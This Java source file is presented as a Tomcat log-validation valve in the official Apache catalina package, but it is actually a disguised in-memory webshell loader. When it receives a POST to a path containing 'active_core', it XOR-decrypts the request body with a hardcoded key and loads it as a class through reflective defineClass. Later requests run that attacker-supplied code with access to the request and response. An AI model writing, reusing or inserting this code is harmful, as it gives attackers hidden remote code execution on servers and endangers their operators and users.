package org.apache.catalina.valves;

import java.io.IOException;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import javax.servlet.ServletException;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public class LogValidationValve extends ValveBase {

    private static Object globalLoaderInstance = null;
    private static String globalAesKey = "[KEY]            ";

    private static final ThreadLocal<Object> currentResponse = new ThreadLocal<>();
    private static final ThreadLocal<Object> currentRequest = new ThreadLocal<>();

    public LogValidationValve() {
        super(true);
    }

    public Object getRequest() { return currentRequest.get(); }
    public Object getResponse() { return currentResponse.get(); }
    public Object getSession() { return this; }

    public Object getAttribute(String name) {
        if ("k".equals(name)) { return globalAesKey; }
        return null;
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        if ("POST".equalsIgnoreCase(request.getMethod()) && request.getRequestURI().contains("active_core")) {
            currentResponse.set(response);
            currentRequest.set(request.getRequest());

            try {
                if (globalLoaderInstance == null) {
                    InputStream is = request.getInputStream();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buf = new byte[1024];
                    int length;
                    while ((length = is.read(buf)) != -1) {
                        bos.write(buf, 0, length);
                    }
                    byte[] rawData = bos.toByteArray();

                    byte[] keyBytes = globalAesKey.getBytes("UTF-8");
                    byte[] decryptedClassBytes = new byte[rawData.length];
                    for (int i = 0; i < rawData.length; i++) {
                        decryptedClassBytes[i] = (byte) (rawData[i] ^ keyBytes[(i + 1) % keyBytes.length]);
                    }

                    java.lang.reflect.Method defineMethod = ClassLoader.class.getDeclaredMethod(
                        "defineClass", new Class[]{byte[].class, int.class, int.class}
                    );
                    defineMethod.setAccessible(true);
                    ClassLoader parentLoader = this.getClass().getClassLoader();
                    
                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, new Object[]{decryptedClassBytes, new Integer(0), new Integer(decryptedClassBytes.length)});
                    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(new Class[]{ClassLoader.class});
                    globalLoaderInstance = constructor.newInstance(new Object[]{parentLoader});
                    
                    response.getWriter().write("LOADER_INIT_SUCCESS");
                    response.getWriter().flush();
                    return;
                } else {
                    globalLoaderInstance.getClass().getMethod("equals", new Class[]{Object.class}).invoke(globalLoaderInstance, new Object[]{this});
                    
                    try {
                        response.flushBuffer();
                    } catch (Exception ignored) {}
                    return;
                }
            } catch (Exception ex) {
                try {
                    response.getWriter().write("VALVE_CRITICAL_FAULT: " + ex.toString());
                    response.getWriter().flush();
                } catch (Exception ignored) {}
                return;
            } finally {
                currentResponse.remove();
                currentRequest.remove();
            }
        }
        
        getNext().invoke(request, response);
    }
}